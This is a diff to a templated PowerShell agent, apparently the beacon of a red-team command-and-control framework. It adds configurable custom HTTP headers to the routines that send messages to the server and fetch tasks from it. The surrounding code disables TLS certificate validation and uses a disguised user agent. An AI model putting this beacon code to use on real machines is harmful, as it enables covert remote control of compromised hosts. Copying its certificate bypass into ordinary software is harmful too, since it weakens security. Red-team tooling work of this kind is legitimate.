@@ -8,6 +8,11 @@ $Script:ServerIndex = 0;
 $Script:Skbytes = [byte[]]@({{ agent_private_cert_key }})
 $Script:pk = [byte[]]@({{ agent_public_cert_key }})
 $Script:serverPubBytes = [byte[]]@({{ server_public_cert_key  }})
+$Script:Headers = @{
+{% for name, value in custom_headers.items() %}
+    '{{ name | replace("'", "''") }}' = '{{ value | replace("'", "''") }}';
+{% endfor %}
+}
 
 if($server.StartsWith('https')){
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
@@ -60,7 +65,7 @@ $Script:SendMessage = {
             if(-not $Script:UserAgent){ $Script:UserAgent = 'Mozilla/5.0 (Windows NT; PowerShell Agent)' }
             $wc.Headers.Add('User-Agent', $Script:UserAgent)
             if($Script:Headers){
-                $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Add($_.Name, $_.Value) }
+                $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Set($_.Name, $_.Value) }
             }
 
             try {
@@ -93,7 +98,7 @@ $Script:GetTask = {
             if(-not $Script:UserAgent){ $Script:UserAgent = 'Mozilla/5.0 (Windows NT; PowerShell Agent)' }
             $wc.Headers.Add("User-Agent",$Script:UserAgent)
             if($Script:Headers){
-                $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Add($_.Name, $_.Value) }
+                $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Set($_.Name, $_.Value) }
             }
             $wc.Headers.Add("Cookie","{{ session_cookie }}=$RoutingCookie")
 
